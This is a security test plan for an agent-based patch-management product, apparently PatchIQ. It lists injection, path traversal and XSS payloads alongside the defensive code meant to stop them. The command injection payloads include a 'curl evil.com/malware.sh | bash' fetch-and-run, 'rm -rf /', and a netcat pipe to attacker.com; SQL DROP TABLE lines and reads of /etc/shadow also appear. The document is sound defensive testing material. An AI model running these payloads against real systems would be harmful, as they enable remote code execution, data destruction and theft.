# Injection Vulnerability Tests

## SQL Injection Tests (Backend)

### Test Case 1: WHERE Clause Injection

**Endpoint:** `GET /v1/agents?hostname=test`

**Payloads:**
```sql
' OR '1'='1
'; DROP TABLE agents; --
1' UNION SELECT * FROM users --
```

**Testing:**
```bash
curl "https://api/v1/agents?hostname=' OR '1'='1"
# Expected: Empty result or validation error, NOT all agents
```

**Result for each payload:**
- `' OR '1'='1`: [ ] Blocked [ ] Escaped [ ] Vulnerable
- `'; DROP TABLE agents; --`: [ ] Blocked [ ] Escaped [ ] Vulnerable
- `1' UNION SELECT`: [ ] Blocked [ ] Escaped [ ] Vulnerable

**Backend Protection:**
```typescript
// Prisma ORM prevents SQL injection via parameterized queries
const agents = await prisma.agent.findMany({
  where: { hostname: req.query.hostname } // ✓ Safe
});
```

---

## Command Injection Tests (Agent)

### Test Case 1: Package Name Injection

**Payload:**
```
package-name; rm -rf /
package-name && curl evil.com/malware.sh | bash
package-name | nc attacker.com 4444
```

**Testing:**
```go
// agent/internal/executors/apt_executor.go
func (e *AptExecutor) Install(packageName string) error {
    // Validate package name (alphanumeric, dash, underscore only)
    if !regexp.MustCompile(`^[a-zA-Z0-9._-]+$`).MatchString(packageName) {
        return fmt.Errorf("invalid package name")
    }

    // Use exec.Command (not shell command)
    cmd := exec.Command("apt-get", "install", "-y", packageName) // ✓ Safe
    return cmd.Run()
}
```

**Result for each payload:**
- `package-name; rm -rf /`: [ ] Blocked [ ] Sanitized [ ] Vulnerable
- `package-name && malware`: [ ] Blocked [ ] Sanitized [ ] Vulnerable
- `package-name | nc`: [ ] Blocked [ ] Sanitized [ ] Vulnerable

---

## Path Traversal Tests

### Test Case 1: File Upload Path

**Payloads:**
```
../../etc/passwd
..\\..\\windows\\system32\\config\\sam
/etc/shadow
```

**Testing:**
```go
func (s *Storage) SaveFile(filename string, data []byte) error {
    // Validate filename (no path traversal)
    if strings.Contains(filename, "..") || filepath.IsAbs(filename) {
        return fmt.Errorf("invalid filename")
    }

    // Restrict to designated directory
    basePath := "/var/lib/patchiq/downloads"
    fullPath := filepath.Join(basePath, filepath.Clean(filename))

    // Ensure path is within basePath
    if !strings.HasPrefix(fullPath, basePath) {
        return fmt.Errorf("path traversal detected")
    }

    return ioutil.WriteFile(fullPath, data, 0644)
}
```

**Result:** [ ] Protected [ ] Vulnerable

---

## XSS Tests (Frontend)

### Test Case 1: Agent Hostname Display

**Payload:**
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
```

**React Protection:**
```tsx
// React escapes by default
<div>{agent.hostname}</div> // ✓ Safe (auto-escaped)

// Dangerous (avoid):
// <div dangerouslySetInnerHTML={{__html: agent.hostname}} /> // ✗ Unsafe
```

**Result:** [ ] Protected [ ] Vulnerable

---

## Security Checklist

- [ ] SQL injection: All payloads blocked
- [ ] Command injection: All payloads blocked
- [ ] Path traversal: All payloads blocked
- [ ] XSS: React auto-escaping working
- [ ] No `dangerouslySetInnerHTML` without sanitization
- [ ] All user inputs validated (Zod schemas)

## Findings

**Critical:** None

**Conclusion:** [ ] Secure [ ] Needs Improvement

---

**Last Updated:** 2026-02-14
